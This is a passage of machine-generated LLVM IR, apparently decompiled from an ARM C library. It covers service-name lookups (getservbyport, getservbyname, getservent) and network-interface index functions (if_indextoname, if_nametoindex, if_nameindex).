  %v3_2ec34 = inttoptr i32 %v2_2ec34 to i32*
  store i32 %v0_2ec34, i32* %v3_2ec34, align 4
  %v0_2ec38 = load i32, i32* %r2.global-to-local, align 4
  %v1_2ec38 = load i32, i32* @r7, align 4
  %v2_2ec38 = add i32 %v1_2ec38, 12
  %v3_2ec38 = inttoptr i32 %v2_2ec38 to i32*
  store i32 %v0_2ec38, i32* %v3_2ec38, align 4
  %v0_2ec3c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_2ec3c, i32* %stack_var_-44, align 4
  br label %dec_label_pc_2ec48

dec_label_pc_2ec44:                               ; preds = %dec_label_pc_2ebc0, %.thread
  store i32 2, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_2ec48

dec_label_pc_2ec48:                               ; preds = %dec_label_pc_2ebf0, %dec_label_pc_2ec44
  store i32 76, i32* %r3.global-to-local, align 4
  %v0_2ec54 = load i32, i32* @r6, align 4
  %v2_2ec54 = add i32 %v0_2ec54, 76
  %v3_2ec54 = inttoptr i32 %v2_2ec54 to i32*
  %v4_2ec54 = load i32, i32* %v3_2ec54, align 4
  call void @__pseudo_branch(i32 %v4_2ec54)
  br label %dec_label_pc_2ec60

dec_label_pc_2ec60:                               ; preds = %bb, %dec_label_pc_2ec48
  %v0_2ec60 = call i32 @__GI___errno_location()
  %v0_2ec64 = load i32, i32* %r4.global-to-local, align 4
  %v2_2ec64 = inttoptr i32 %v0_2ec60 to i32*
  store i32 %v0_2ec64, i32* %v2_2ec64, align 4
  %v0_2ec68 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v3_2eb28, i32* @r4, align 4
  store i32 %v6_2eb28, i32* @r5, align 4
  store i32 %v9_2eb28, i32* @r6, align 4
  store i32 %v12_2eb28, i32* @r7, align 4
  store i32 %v15_2eb28, i32* @r8, align 4
  store i32 %v18_2eb28, i32* @sb, align 4
  store i32 %v21_2eb28, i32* @sl, align 4
  store i32 %v24_2eb28, i32* @fp, align 4
  store i32 %v27_2eb28, i32* @lr, align 4
  ret i32 %v0_2ec68

; uselistorder directives
  uselistorder i32 %tmp17, { 1, 0 }
  uselistorder i32 %v1_2ec0c, { 1, 0 }
  uselistorder i32 %v4_2ebb4, { 2, 0, 3, 1, 4 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 4, 3 }
  uselistorder i32* %r4.global-to-local, { 3, 4, 1, 0, 2, 5 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11, 12, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 %arg3, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_2ec60, { 1, 0 }
  uselistorder label %dec_label_pc_2ec48, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_2eb60, { 1, 0 }
}

define i32 @function_2ec7c(i32 %arg1) local_unnamed_addr {
dec_label_pc_2ec7c:
  %v0_2ec7c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_2ec7c, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_2ec7c
  %v2_2ec84 = load i32, i32* @r4, align 4
  %v5_2ec84 = udiv i32 %v2_2ec84, 2
  %v6_2ec84 = and i32 %v5_2ec84, %arg1
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_2ec7c, %bb
  %v7_2ec84 = phi i32 [ %arg1, %dec_label_pc_2ec7c ], [ %v6_2ec84, %bb ]
  ret i32 %v7_2ec84

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__GI_getservbyport_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32* %arg6) local_unnamed_addr {
entry:
  %tmp2 = ptrtoint i32* %arg6 to i32
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* @r5, align 4
  store i32 %arg3, i32* @r6, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 20840), i32* @r4, align 4
  store i32 %arg1, i32* @sl, align 4
  store i32 %arg2, i32* @r7, align 4
  store i32 %arg4, i32* @r8, align 4
  store i32 %arg5, i32* @fp, align 4
  store i32 %tmp2, i32* @sb, align 4
  %v4_2ece4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 164) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_2ece4)
  %v0_2ecf8 = load i32, i32* @r5, align 4
  %v2_2ecf8 = add i32 %v0_2ecf8, 36
  %v3_2ecf8 = inttoptr i32 %v2_2ecf8 to i32*
  %v4_2ecf8 = load i32, i32* %v3_2ecf8, align 4
  store i32 191748, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_2ecf8)
  %v0_2ed08 = load i32, i32* @r5, align 4
  %v2_2ed08 = add i32 %v0_2ed08, 55940
  %v3_2ed08 = inttoptr i32 %v2_2ed08 to i32*
  %v4_2ed08 = load i32, i32* %v3_2ed08, align 4
  %v1_2ed0c = call i32 @setservent(i32 %v4_2ed08)
  br label %dec_label_pc_2ed38

dec_label_pc_2ed14:                               ; preds = %dec_label_pc_2ed38
  %v0_2ed14 = load i32, i32* @r6, align 4
  %v1_2ed14 = add i32 %v0_2ed14, 8
  %v2_2ed14 = inttoptr i32 %v1_2ed14 to i32*
  %v3_2ed14 = load i32, i32* %v2_2ed14, align 4
  %v1_2ed18 = load i32, i32* @sl, align 4
  %v9_2ed18 = icmp eq i32 %v3_2ed14, %v1_2ed18
  br i1 %v9_2ed18, label %dec_label_pc_2ed20, label %dec_label_pc_2ed38

dec_label_pc_2ed20:                               ; preds = %dec_label_pc_2ed14
  %v0_2ed20 = load i32, i32* @r7, align 4
  store i32 %v0_2ed20, i32* @r1, align 4
  %v2_2ed20 = icmp eq i32 %v0_2ed20, 0
  br i1 %v2_2ed20, label %dec_label_pc_2ed54, label %dec_label_pc_2ed28

dec_label_pc_2ed28:                               ; preds = %dec_label_pc_2ed20
  %v1_2ed28 = add i32 %v0_2ed14, 12
  %v2_2ed28 = inttoptr i32 %v1_2ed28 to i32*
  %v3_2ed28 = load i32, i32* %v2_2ed28, align 4
  %v2_2ed2c = inttoptr i32 %v3_2ed28 to i8*
  %v3_2ed2c = call i32 @__GI_strcoll(i8* %v2_2ed2c, i32 %v0_2ed20)
  %v2_2ed30 = icmp eq i32 %v3_2ed2c, 0
  br i1 %v2_2ed30, label %dec_label_pc_2ed54, label %dec_label_pc_2ed38

dec_label_pc_2ed38:                               ; preds = %dec_label_pc_2ed14, %dec_label_pc_2ed28, %entry
  %v0_2ed38 = load i32, i32* @r8, align 4
  %v0_2ed3c = load i32, i32* @fp, align 4
  %v0_2ed40 = load i32, i32* @sb, align 4
  %v0_2ed44 = load i32, i32* @r6, align 4
  %v4_2ed48 = inttoptr i32 %v0_2ed44 to i32*
  %v5_2ed48 = call i32 @getservent_r(i32* %v4_2ed48, i32 %v0_2ed38, i32 %v0_2ed3c, i32 %v0_2ed40)
  store i32 %v5_2ed48, i32* @r4, align 4
  %v2_2ed4c = icmp eq i32 %v5_2ed48, 0
  br i1 %v2_2ed4c, label %dec_label_pc_2ed14, label %dec_label_pc_2ed54

dec_label_pc_2ed54:                               ; preds = %dec_label_pc_2ed28, %dec_label_pc_2ed20, %dec_label_pc_2ed38
  %v0_2ed58 = load i32, i32* @r5, align 4
  %v2_2ed58 = add i32 %v0_2ed58, 55940
  %v3_2ed58 = inttoptr i32 %v2_2ed58 to i32*
  %v4_2ed58 = load i32, i32* %v3_2ed58, align 4
  %v2_2ed5c = icmp eq i32 %v4_2ed58, 0
  call void @__pseudo_cond_branch(i1 %v2_2ed5c, i32 ptrtoint (i32* @global_var_2e9a0.2013 to i32))
  %v0_2ed70 = load i32, i32* @r5, align 4
  %v2_2ed70 = add i32 %v0_2ed70, 76
  %v3_2ed70 = inttoptr i32 %v2_2ed70 to i32*
  %v4_2ed70 = load i32, i32* %v3_2ed70, align 4
  call void @__pseudo_branch(i32 %v4_2ed70)
  %v0_2ed7c = load i32, i32* @sb, align 4
  %v1_2ed7c = inttoptr i32 %v0_2ed7c to i32*
  %v2_2ed7c = load i32, i32* %v1_2ed7c, align 4
  %v2_2ed80 = icmp eq i32 %v2_2ed7c, 0
  %v1_2ed84 = load i32, i32* @r4, align 4
  %storemerge = select i1 %v2_2ed80, i32 %v1_2ed84, i32 0
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_2ed20, { 0, 2, 1 }
  uselistorder label %dec_label_pc_2ed54, { 2, 0, 1 }
  uselistorder label %dec_label_pc_2ed38, { 1, 0, 2 }
}

define i32 @function_2ed9c(i32 %arg1) local_unnamed_addr {
dec_label_pc_2ed9c:
  %v0_2ed9c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_2ed9c, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_2ed9c
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_2ed9c, %bb
  %v4_2edb0 = phi i32 [ %arg1, %dec_label_pc_2ed9c ], [ 0, %bb ]
  ret i32 %v4_2edb0

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @__GI_getservbyport(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r5, align 4
  %v0_2edc4 = call i32 @__initbuf()
  %v4_2ede8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 55916) to i32*), align 4
  %v0_2edec = load i32, i32* @r4, align 4
  %v0_2edf0 = load i32, i32* @r5, align 4
  %v7_2edf8 = call i32 @__GI_getservbyport_r(i32 %v0_2edec, i32 %v0_2edf0, i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 55924), i32 %v4_2ede8, i32 304, i32* nonnull %stack_var_-20)
  %v3_2edfc = load i32, i32* %stack_var_-20, align 4
  ret i32 %v3_2edfc

; uselistorder directives
  uselistorder i32* %stack_var_-20, { 1, 0 }
}

define i32 @getservbyname_r(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg3 to i32
  %stack_var_0 = alloca i32, align 4
  %tmp14 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp14, i32* %stack_var_0, align 4
  %v3_2ee18 = load i32, i32* @r4, align 4
  %v6_2ee18 = load i32, i32* @r5, align 4
  %v9_2ee18 = load i32, i32* @r6, align 4
  %v12_2ee18 = load i32, i32* @r7, align 4
  %v15_2ee18 = load i32, i32* @r8, align 4
  %v18_2ee18 = load i32, i32* @sb, align 4
  %v21_2ee18 = load i32, i32* @sl, align 4
  %v24_2ee18 = load i32, i32* @fp, align 4
  %v27_2ee18 = load i32, i32* @lr, align 4
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* @r5, align 4
  store i32 %tmp, i32* @r6, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 20840), i32* @r4, align 4
  store i32 %arg1, i32* @r8, align 4
  store i32 %arg2, i32* @r7, align 4
  store i32 %arg4, i32* @sb, align 4
  %v4_2ee58 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 164) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_2ee58)
  %v0_2ee6c = load i32, i32* @r5, align 4
  %v2_2ee6c = add i32 %v0_2ee6c, 36
  %v3_2ee6c = inttoptr i32 %v2_2ee6c to i32*
  %v4_2ee6c = load i32, i32* %v3_2ee6c, align 4
  store i32 192120, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_2ee6c)
  %v0_2ee7c = load i32, i32* @r5, align 4
  %v2_2ee7c = add i32 %v0_2ee7c, 55940
  %v3_2ee7c = inttoptr i32 %v2_2ee7c to i32*
  %v4_2ee7c = load i32, i32* %v3_2ee7c, align 4
  %v1_2ee80 = call i32 @setservent(i32 %v4_2ee7c)
  br label %dec_label_pc_2eee4

dec_label_pc_2ee88:                               ; preds = %dec_label_pc_2eee4
  %v0_2ee88 = load i32, i32* @r8, align 4
  %v0_2ee8c = load i32, i32* @r6, align 4
  %v1_2ee8c = inttoptr i32 %v0_2ee8c to i32*
  %v2_2ee8c = load i32, i32* %v1_2ee8c, align 4
  store i32 %v2_2ee8c, i32* @r1, align 4
  %v2_2ee90 = inttoptr i32 %v0_2ee88 to i8*
  %v3_2ee90 = call i32 @__GI_strcoll(i8* %v2_2ee90, i32 %v2_2ee8c)
  %v2_2ee94 = icmp eq i32 %v3_2ee90, 0
  br i1 %v2_2ee94, label %dec_label_pc_2eec8, label %dec_label_pc_2eeb0.preheader

dec_label_pc_2eeb0.preheader:                     ; preds = %dec_label_pc_2ee88
  %v1_2ee98 = load i32, i32* @r6, align 4
  %v2_2ee98 = add i32 %v1_2ee98, 4
  %v3_2ee98 = inttoptr i32 %v2_2ee98 to i32*
  %v4_2ee98 = load i32, i32* %v3_2ee98, align 4
  %v1_2eeb018 = inttoptr i32 %v4_2ee98 to i32*
  %v2_2eeb019 = load i32, i32* %v1_2eeb018, align 4
  store i32 %v2_2eeb019, i32* @r1, align 4
  %v2_2eeb421 = icmp eq i32 %v2_2eeb019, 0
  %v0_2eeb822 = load i32, i32* @r8, align 4
  %v1_2eebc23 = add i32 %v4_2ee98, 4
  store i32 %v1_2eebc23, i32* @r4, align 4
  br i1 %v2_2eeb421, label %dec_label_pc_2eee4.backedge, label %dec_label_pc_2eea4

dec_label_pc_2eea4:                               ; preds = %dec_label_pc_2eeb0.preheader, %dec_label_pc_2eea4.dec_label_pc_2eeb0_crit_edge
  %v0_2eeb825 = phi i32 [ %v0_2eeb8, %dec_label_pc_2eea4.dec_label_pc_2eeb0_crit_edge ], [ %v0_2eeb822, %dec_label_pc_2eeb0.preheader ]
  %v2_2eeb024 = phi i32 [ %v2_2eeb0, %dec_label_pc_2eea4.dec_label_pc_2eeb0_crit_edge ], [ %v2_2eeb019, %dec_label_pc_2eeb0.preheader ]
  %v2_2eea4 = inttoptr i32 %v0_2eeb825 to i8*
  %v3_2eea4 = call i32 @__GI_strcoll(i8* %v2_2eea4, i32 %v2_2eeb024)
  %v2_2eea8 = icmp eq i32 %v3_2eea4, 0
  br i1 %v2_2eea8, label %dec_label_pc_2eec8, label %dec_label_pc_2eea4.dec_label_pc_2eeb0_crit_edge

dec_label_pc_2eea4.dec_label_pc_2eeb0_crit_edge:  ; preds = %dec_label_pc_2eea4
  %v0_2eeb0.pre = load i32, i32* @r4, align 4
  %v1_2eeb0 = inttoptr i32 %v0_2eeb0.pre to i32*
  %v2_2eeb0 = load i32, i32* %v1_2eeb0, align 4
  store i32 %v2_2eeb0, i32* @r1, align 4
  %v2_2eeb4 = icmp eq i32 %v2_2eeb0, 0
  %v0_2eeb8 = load i32, i32* @r8, align 4
  %v1_2eebc = add i32 %v0_2eeb0.pre, 4
  store i32 %v1_2eebc, i32* @r4, align 4
  br i1 %v2_2eeb4, label %dec_label_pc_2eee4.backedge, label %dec_label_pc_2eea4

dec_label_pc_2eec8:                               ; preds = %dec_label_pc_2eea4, %dec_label_pc_2ee88
  %v0_2eec8 = load i32, i32* @r7, align 4
  %v2_2eec8 = icmp eq i32 %v0_2eec8, 0
  br i1 %v2_2eec8, label %dec_label_pc_2ef00, label %dec_label_pc_2eed0

dec_label_pc_2eed0:                               ; preds = %dec_label_pc_2eec8
  %v0_2eed0 = load i32, i32* @r6, align 4
  %v1_2eed0 = add i32 %v0_2eed0, 12
  %v2_2eed0 = inttoptr i32 %v1_2eed0 to i32*
  %v3_2eed0 = load i32, i32* %v2_2eed0, align 4
  store i32 %v0_2eec8, i32* @r1, align 4
  %v2_2eed8 = inttoptr i32 %v3_2eed0 to i8*
  %v3_2eed8 = call i32 @__GI_strcoll(i8* %v2_2eed8, i32 %v0_2eec8)
  %v2_2eedc = icmp eq i32 %v3_2eed8, 0
  br i1 %v2_2eedc, label %dec_label_pc_2ef00, label %dec_label_pc_2eee4.backedge

dec_label_pc_2eee4.backedge:                      ; preds = %dec_label_pc_2eeb0.preheader, %dec_label_pc_2eea4.dec_label_pc_2eeb0_crit_edge, %dec_label_pc_2eed0
  %v3_2eeec.pre = load i32, i32* %stack_var_0, align 4
  br label %dec_label_pc_2eee4

dec_label_pc_2eee4:                               ; preds = %dec_label_pc_2eee4.backedge, %entry
  %v3_2eeec = phi i32 [ %v3_2eeec.pre, %dec_label_pc_2eee4.backedge ], [ %tmp14, %entry ]
  %v0_2eee4 = load i32, i32* @r6, align 4
  %v0_2eee8 = load i32, i32* @sb, align 4
  %v0_2eef0 = load i32, i32* @fp, align 4
  %v4_2eef4 = inttoptr i32 %v0_2eee4 to i32*
  %v5_2eef4 = call i32 @getservent_r(i32* %v4_2eef4, i32 %v0_2eee8, i32 %v3_2eeec, i32 %v0_2eef0)
  store i32 %v5_2eef4, i32* @sl, align 4
  %v2_2eef8 = icmp eq i32 %v5_2eef4, 0
  br i1 %v2_2eef8, label %dec_label_pc_2ee88, label %dec_label_pc_2ef00

dec_label_pc_2ef00:                               ; preds = %dec_label_pc_2eed0, %dec_label_pc_2eec8, %dec_label_pc_2eee4
  %v0_2ef04 = load i32, i32* @r5, align 4
  %v2_2ef04 = add i32 %v0_2ef04, 55940
  %v3_2ef04 = inttoptr i32 %v2_2ef04 to i32*
  %v4_2ef04 = load i32, i32* %v3_2ef04, align 4
  %v2_2ef08 = icmp eq i32 %v4_2ef04, 0
  call void @__pseudo_cond_branch(i1 %v2_2ef08, i32 ptrtoint (i32* @global_var_2e9a0.2013 to i32))
  %v0_2ef1c = load i32, i32* @r5, align 4
  %v2_2ef1c = add i32 %v0_2ef1c, 76
  %v3_2ef1c = inttoptr i32 %v2_2ef1c to i32*
  %v4_2ef1c = load i32, i32* %v3_2ef1c, align 4
  store i32 %v4_2ef1c, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v4_2ef1c)
  %v0_2ef28 = load i32, i32* @fp, align 4
  %v1_2ef28 = inttoptr i32 %v0_2ef28 to i32*
  %v2_2ef28 = load i32, i32* %v1_2ef28, align 4
  %v2_2ef2c = icmp eq i32 %v2_2ef28, 0
  %v1_2ef30 = load i32, i32* @sl, align 4
  %storemerge = select i1 %v2_2ef2c, i32 %v1_2ef30, i32 0
  store i32 %v3_2ee18, i32* @r4, align 4
  store i32 %v6_2ee18, i32* @r5, align 4
  store i32 %v9_2ee18, i32* @r6, align 4
  store i32 %v12_2ee18, i32* @r7, align 4
  store i32 %v15_2ee18, i32* @r8, align 4
  store i32 %v18_2ee18, i32* @sb, align 4
  store i32 %v21_2ee18, i32* @sl, align 4
  store i32 %v24_2ee18, i32* @fp, align 4
  store i32 %v27_2ee18, i32* @lr, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_2eec8, { 1, 0, 2 }
  uselistorder i32 %v2_2eeb0, { 1, 2, 0 }
  uselistorder i32 %v0_2eeb0.pre, { 1, 0 }
  uselistorder i32 (i32)* @setservent, { 1, 0 }
  uselistorder i32 55940, { 2, 3, 4, 5, 0, 1, 6 }
  uselistorder label %dec_label_pc_2ef00, { 2, 0, 1 }
  uselistorder label %dec_label_pc_2eee4.backedge, { 2, 1, 0 }
  uselistorder label %dec_label_pc_2eea4, { 1, 0 }
}

define i32 @function_2ef48(i32 %arg1) local_unnamed_addr {
dec_label_pc_2ef48:
  %v0_2ef48 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_2ef48, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_2ef48
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_2ef48, %bb
  %v4_2ef5c = phi i32 [ %arg1, %dec_label_pc_2ef48 ], [ 0, %bb ]
  ret i32 %v4_2ef5c

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @getservbyname(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r5, align 4
  %v0_2ef70 = call i32 @__initbuf()
  %v4_2ef94 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 55916) to i32*), align 4
  %v0_2ef98 = load i32, i32* @r4, align 4
  %v0_2ef9c = load i32, i32* @r5, align 4
  %v7_2efa4 = call i32 @getservbyname_r(i32 %v0_2ef98, i32 %v0_2ef9c, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 55924) to i32*), i32 %v4_2ef94)
  ret i32 %tmp4

; uselistorder directives
  uselistorder i32 (i32, i32, i32*, i32)* @getservbyname_r, { 1, 0 }
}

define i32 @getservent() local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  store i32 88492, i32* @r4, align 4
  %v0_2efd0 = call i32 @__initbuf()
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* @r4, align 4
  %v4_2efe0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 55916) to i32*), align 4
  %v2_2efec = ptrtoint i32* %stack_var_-12 to i32
  %v5_2eff0 = call i32 @getservent_r(i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 55924) to i32*), i32 %v4_2efe0, i32 304, i32 %v2_2efec)
  %v3_2eff4 = load i32, i32* %stack_var_-12, align 4
  ret i32 %v3_2eff4

; uselistorder directives
  uselistorder i32 304, { 1, 0, 2, 5, 4, 3 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 55924), { 1, 0 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 55924) to i32*), { 1, 0 }
  uselistorder i32 ()* @__initbuf, { 2, 1, 0 }
}

define i32 @if_indextoname(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-56 = alloca i32, align 4
  %v2_2f014 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %arg2, i32* %r5.global-to-local, align 4
  %v0_2f020 = call i32 @__opensock()
  store i32 %v0_2f020, i32* %r0.global-to-local, align 4
  store i32 %v0_2f020, i32* @r7, align 4
  %v1_2f024 = icmp slt i32 %v0_2f020, 0
  br i1 %v1_2f024, label %.thread, label %dec_label_pc_2f030

.thread:                                          ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_2f094

dec_label_pc_2f030:                               ; preds = %entry
  %v3_2f03c = call i32 @ioctl(i32 %v0_2f020, i32 35088, i32 %v2_2f014)
  store i32 %v3_2f03c, i32* %r0.global-to-local, align 4
  %v1_2f040 = icmp slt i32 %v3_2f03c, 0
  br i1 %v1_2f040, label %dec_label_pc_2f04c, label %dec_label_pc_2f078

dec_label_pc_2f04c:                               ; preds = %dec_label_pc_2f030
  %v0_2f04c = call i32 @__GI___errno_location()
  store i32 %v0_2f04c, i32* %r0.global-to-local, align 4
  %v1_2f054 = inttoptr i32 %v0_2f04c to i32*
  %v2_2f054 = load i32, i32* %v1_2f054, align 4
  %v0_2f058 = load i32, i32* @r7, align 4
  store i32 %v0_2f058, i32* %r0.global-to-local, align 4
  %v7_2f064 = icmp eq i32 %v2_2f054, 19
  br i1 %v7_2f064, label %bb, label %bb11

bb:                                               ; preds = %dec_label_pc_2f04c
  br label %bb11

bb11:                                             ; preds = %dec_label_pc_2f04c, %bb
  %v0_2f070 = phi i32 [ %v2_2f054, %dec_label_pc_2f04c ], [ 6, %bb ]
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v0_2f070, i32* %v1_2f054, align 4
  %v1_2f09c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_2f094

dec_label_pc_2f078:                               ; preds = %dec_label_pc_2f030
  %v0_2f088 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_2f088, i32* %r0.global-to-local, align 4
  store i32 %v2_2f014, i32* @r1, align 4
  %v2_2f090 = call i32 @strncpy(i32 %v0_2f088, i32 %v2_2f014)
  store i32 %v2_2f090, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_2f094

dec_label_pc_2f094:                               ; preds = %.thread, %bb11, %dec_label_pc_2f078
  %v1_2f09c = phi i32 [ %v1_2f09c.pre, %bb11 ], [ %v2_2f090, %dec_label_pc_2f078 ], [ 0, %.thread ]
  ret i32 %v1_2f09c

; uselistorder directives
  uselistorder i32 %v2_2f014, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 5, 1, 2, 3, 4, 6, 8, 7, 9, 0 }
  uselistorder label %dec_label_pc_2f094, { 2, 1, 0 }
  uselistorder label %bb11, { 1, 0 }
}

define i32 @__GI_if_nametoindex(i32 %arg1) local_unnamed_addr {
entry:
  %r5.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-48 = alloca i32, align 4
  %v9_2f0a4 = load i32, i32* @r7, align 4
  %v2_2f0a8 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %arg1, i32* %r5.global-to-local, align 4
  %v0_2f0b0 = call i32 @__opensock()
  store i32 %v0_2f0b0, i32* @r7, align 4
  %v1_2f0b4 = icmp slt i32 %v0_2f0b0, 0
  br i1 %v1_2f0b4, label %dec_label_pc_2f10c, label %dec_label_pc_2f0bc

dec_label_pc_2f0bc:                               ; preds = %entry
  %v0_2f0bc = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_2f0bc, i32* @r1, align 4
  %v2_2f0c8 = call i32 @strncpy(i32 %v2_2f0a8, i32 %v0_2f0bc)
  %v0_2f0cc = load i32, i32* @r7, align 4
  %v3_2f0d8 = call i32 @ioctl(i32 %v0_2f0cc, i32 35123, i32 %v2_2f0a8)
  %v1_2f0dc = icmp slt i32 %v3_2f0d8, 0
  %.v3_2f108 = select i1 %v1_2f0dc, i32 0, i32 %tmp
  br label %dec_label_pc_2f10c

dec_label_pc_2f10c:                               ; preds = %dec_label_pc_2f0bc, %entry
  %storemerge = phi i32 [ 0, %entry ], [ %.v3_2f108, %dec_label_pc_2f0bc ]
  store i32 %v9_2f0a4, i32* @r7, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 (i32, i32)* @strncpy, { 8, 7, 6, 1, 0, 5, 4, 3, 2 }
}

define i32 @__GI_if_nameindex(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 192808, i32* %stack_var_-4, align 4
  %v2_2f124 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_2f124, i32* @fp, align 4
  %v2_2f128 = ptrtoint i32* %stack_var_-56 to i32
  %v0_2f12c = call i32 @__opensock()
  store i32 %v0_2f12c, i32* @r6, align 4
  %v1_2f130 = icmp slt i32 %v0_2f12c, 0
  br i1 %v1_2f130, label %dec_label_pc_2f194, label %dec_label_pc_2f138

dec_label_pc_2f138:                               ; preds = %entry
  store i32 %v2_2f128, i32* @r5, align 4
  br label %dec_label_pc_2f148

dec_label_pc_2f148:                               ; preds = %dec_label_pc_2f19c, %dec_label_pc_2f138
  %v2_2f164 = phi i32 [ 128, %dec_label_pc_2f138 ], [ %v3_2f19c, %dec_label_pc_2f19c ]
  %stack_var_-52.0 = phi i32 [ 0, %dec_label_pc_2f138 ], [ %v2_2f154, %dec_label_pc_2f19c ]
  %v2_2f148 = mul i32 %v2_2f164, 2
  store i32 %v2_2f148, i32* @r7, align 4
  %v1_2f14c = add i32 %v2_2f148, 14
  %v1_2f150 = and i32 %v1_2f14c, -8
  %v1_2f154 = load i32, i32* @sp, align 4
  %v2_2f154 = sub i32 %v1_2f154, %v1_2f150
  store i32 %stack_var_-52.0, i32* @r3, align 4
  %v2_2f15c = add i32 %v2_2f154, %v2_2f148
  %v9_2f160 = icmp eq i32 %v2_2f15c, %stack_var_-52.0
  br i1 %v9_2f160, label %bb, label %bb23

bb:                                               ; preds = %dec_label_pc_2f148
  %v3_2f164 = mul i32 %v2_2f164, 3
  store i32 %v3_2f164, i32* @r7, align 4
  br label %bb23

bb23:                                             ; preds = %dec_label_pc_2f148, %bb
  %v0_2f178 = phi i32 [ %v2_2f148, %dec_label_pc_2f148 ], [ %v3_2f164, %bb ]
  %v0_2f168 = load i32, i32* @r6, align 4
  store i32 %v2_2f128, i32* %r2.global-to-local, align 4
  store i32 %v0_2f178, i32* %stack_var_-56, align 4
  %v3_2f17c = call i32 @ioctl(i32 %v0_2f168, i32 35090, i32 %v2_2f128)
  %v1_2f180 = icmp slt i32 %v3_2f17c, 0
  br i1 %v1_2f180, label %dec_label_pc_2f188, label %dec_label_pc_2f19c

dec_label_pc_2f188:                               ; preds = %bb23
  br label %dec_label_pc_2f194

dec_label_pc_2f194:                               ; preds = %dec_label_pc_2f188, %entry
  store i32 0, i32* @sl, align 4
  br label %dec_label_pc_2f2b0

dec_label_pc_2f19c:                               ; preds = %bb23
  %v3_2f19c = load i32, i32* %stack_var_-56, align 4
  %v1_2f1a0 = load i32, i32* @r7, align 4
  %v9_2f1a0 = icmp eq i32 %v3_2f19c, %v1_2f1a0
  store i32 %v3_2f19c, i32* @r4, align 4
  br i1 %v9_2f1a0, label %dec_label_pc_2f148, label %dec_label_pc_2f1ac

